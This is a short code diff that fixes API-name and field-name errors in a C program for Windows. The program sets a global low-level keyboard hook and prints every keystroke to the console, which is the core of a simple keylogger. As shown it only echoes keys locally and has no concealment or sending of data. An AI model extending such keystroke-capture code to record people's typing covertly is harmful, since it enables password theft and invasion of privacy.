@@ -12,7 +12,7 @@ LRESULT CALLBACK hook_function(int code, WPARAM wParam, LPARAM lParam);
 int main() {
 	MSG msg;  // message variable
 
-	hook = SetWindowHookExA(WH_KEYBOARD_LL, hook_function, NULL, 0);
+	hook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_function, NULL, 0);
 
 	// if the function fails, then the value returned is null
 	if(hook == NULL) { 
@@ -31,16 +31,16 @@ int main() {
 LRESULT CALLBACK hook_function(int code, WPARAM wParam, LPARAM lParam){
 	char ch;
 	// structure with the information about low-level keyboard input events
-	PKBDLLHOOKSTRUCT kbdllhook = (PKBDLLHOOKSTRUCT)lParam;
+	PKBDLLHOOKSTRUCT kbDllHook = (PKBDLLHOOKSTRUCT)lParam;
 	
 	// takes only the keydown input so that it doesn't duplicate the keys pressed
 	if(wParam == WM_KEYDOWN && code == HC_ACTION){
 		if(!GetAsyncKeyState(VK_SHIFT)){
-			ch = kbdllhook->vkcode + 32;
+			ch = kbDllHook->vkCode + 32;
 		}
 		
 		else{
-			ch = kbdllhook->vkcode;
+			ch = kbDllHook->vkCode;
 		}
 
 		printf("%c", ch);
